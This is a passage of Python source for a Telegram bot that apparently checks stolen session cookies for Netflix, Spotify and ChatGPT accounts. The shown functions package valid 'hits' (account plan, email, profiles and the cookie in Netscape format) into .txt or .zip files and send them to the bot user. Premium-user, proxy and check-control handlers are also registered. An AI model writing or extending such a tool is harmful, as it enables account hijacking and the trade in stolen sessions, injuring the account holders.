    hits = user_state.get(user_id, {}).get('final_hits', OrderedDict())
    if not hits:
        await query.answer("No hits available.")
        return

    mode = user_state[user_id].get('mode', 'netflix')
    if mode == "netflix":
        domain = ".netflix.com"
    elif mode == "spotify":
        domain = ".spotify.com"
    else:
        domain = ".chat.openai.com"

    all_hits = []
    tmp_path = user_state.get(user_id, {}).get('hits_tmp')
    if tmp_path and os.path.exists(tmp_path):
        with open(tmp_path) as f:
            for idx, line in enumerate(f, 1):
                result = json.loads(line)
                build_export(result, idx, all_hits, mode, domain)
    else:
        for idx, (name, details_dict) in enumerate(hits.items(), 1):
            build_export(details_dict, idx, all_hits, mode, domain)

    txt_buffer = io.BytesIO(("\n\n".join(all_hits)).encode("utf-8"))
    await context.bot.send_document(
        chat_id,
        document=InputFile(txt_buffer, filename="All_Hits.txt"),
        caption=f"All hits as .txt file"
    )
    await query.answer("Sent as .txt")

async def send_result_zip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    hits = user_state.get(user_id, {}).get('final_hits', OrderedDict())
    if not hits:
        await query.answer("No hits available.")
        return

    mode = user_state[user_id].get('mode', 'netflix')
    if mode == "netflix":
        domain = ".netflix.com"
    elif mode == "spotify":
        domain = ".spotify.com"
    else:
        domain = ".chat.openai.com"
    
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
        tmp_path = user_state.get(user_id, {}).get('hits_tmp')
        if tmp_path and os.path.exists(tmp_path):
            with open(tmp_path) as f:
                for idx, line in enumerate(f, 1):
                    result = json.loads(line)
                    file_content = build_export_str(result, idx, mode, domain)
                    zipf.writestr(f"cookie_{idx}.txt", file_content)
        else:
            for idx, (name, details_dict) in enumerate(hits.items(), 1):
                file_content = build_export_str(details_dict, idx, mode, domain)
                zipf.writestr(f"cookie_{idx}.txt", file_content)
    zip_buffer.seek(0)
    await context.bot.send_document(
        chat_id,
        document=InputFile(zip_buffer, filename="All_Hits.zip"),
        caption=f"All hits as .zip file"
    )
    await query.answer("Sent as .zip")

def build_export_str(details_dict, idx, mode, domain):
    if mode == 'netflix':
        details = [
            f"Plan: {clean_unicode(details_dict.get('plan', 'Unknown'))}",
            f"Email: {clean_unicode(details_dict.get('email', 'Unknown'))}",
            f"Profiles: {clean_unicode(details_dict.get('profiles', 'Unknown'))}",
        ]
    else:
        details = [
            f"Plan: {clean_unicode(details_dict.get('plan', 'Unknown'))}",
            f"Email: {clean_unicode(details_dict.get('email', 'Unknown'))}",
        ]

    cookie_dict = details_dict.get('cookie', {})
    if isinstance(cookie_dict, dict):
        netscape = dict_to_netscape(cookie_dict, domain)
    else:
        netscape = str(cookie_dict)

    return (
        f"========== HIT #{idx} ==========\n" +
        "\n".join(details) +
        "\nNetscape Cookie ↓\n" +
        netscape
    )

def build_export(details_dict, idx, all_hits, mode, domain):
    all_hits.append(build_export_str(details_dict, idx, mode, domain))

# -------------- MAIN --------------
if __name__ == "__main__":
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("add", add_premium))
    app.add_handler(CommandHandler("remove", remove_premium))
    app.add_handler(CommandHandler("setproxy", set_proxy))
    app.add_handler(CommandHandler("users", list_users))
    app.add_handler(CallbackQueryHandler(mode_button, pattern="^mode_(spotify|netflix|chatgpt)$"))
    app.add_handler(CallbackQueryHandler(switchmode, pattern="^switchmode_(spotify|netflix|chatgpt)$"))
    app.add_handler(CallbackQueryHandler(stop_check, pattern="^stop_check$"))
    app.add_handler(CallbackQueryHandler(send_result_txt, pattern="^result_txt$"))
    app.add_handler(CallbackQueryHandler(send_result_zip, pattern="^result_zip$"))
    app.add_handler(CallbackQueryHandler(start_check, pattern="^start_check$"))
    app.add_handler(CallbackQueryHandler(get_hits, pattern="^get_hits$"))
    app.add_handler(MessageHandler(filters.Document.ALL & ~filters.COMMAND, file_upload))

    app.run_polling()
